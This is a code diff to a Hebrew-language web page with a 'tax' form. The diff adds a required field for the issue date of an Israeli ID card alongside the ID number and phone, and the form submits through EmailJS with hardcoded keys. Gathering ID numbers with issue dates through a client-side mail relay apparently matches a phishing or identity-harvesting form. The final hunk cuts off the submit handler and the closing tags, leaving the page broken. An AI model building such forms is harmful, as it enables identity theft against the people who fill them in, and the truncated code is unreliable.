@@ -150,6 +150,10 @@
         <input type="text" id="id-number" name="id-number" placeholder="מספר תעודת זהות" required maxlength="9" pattern="[0-9]{9}" title="תעודת זהות חייבת להכיל 9 ספרות">
       </div>
       <div class="form-group">
+        <label for="id-date">תאריך הנפקה של תעודת זהות</label>
+        <input type="date" id="id-date" name="id-date" required>
+      </div>
+      <div class="form-group">
         <label for="phone">נייד</label>
         <input type="tel" id="phone" name="phone" placeholder="נייד ליצירת קשר" required maxlength="10" pattern="[0-9]{10}" title="נייד חייב להכיל 10 ספרות">
       </div>
@@ -169,7 +173,7 @@
 </div>
 
 <script type="text/javascript">
-  emailjs.init("t2eGSdp94pjW_SynR"); // הוסף את ה-User ID שלך מ-EmailJS
+  emailjs.init("t2eGSdp94pjW_SynR"); // מפתח ציבורי שלך
 
   document.getElementById('taxForm').addEventListener('submit', function(e) {
     e.preventDefault();
@@ -180,18 +184,4 @@
     // שלח את הנתונים ל-EmailJS
     emailjs.sendForm('service_qgukpno', 'template_d7lfkgq', this)
       .then(function(response) {
-        console.log('SUCCESS', response);
-        alert('הבקשה שלך נקלטה בהצלחה!');
-        // הסתר את הפופ-אפ לאחר שליחה מוצלחת
-        document.getElementById('popup').style.display = 'none';
-      }, function(error) {
-        console.log('FAILED', error);
-        alert('שגיאה בשליחת המייל, נסה שנית');
-        // הסתר את הפופ-אפ במקרה של שגיאה
-        document.getElementById('popup').style.display = 'none';
-      });
-  });
-</script>
-
-</body>
-</html>
+       
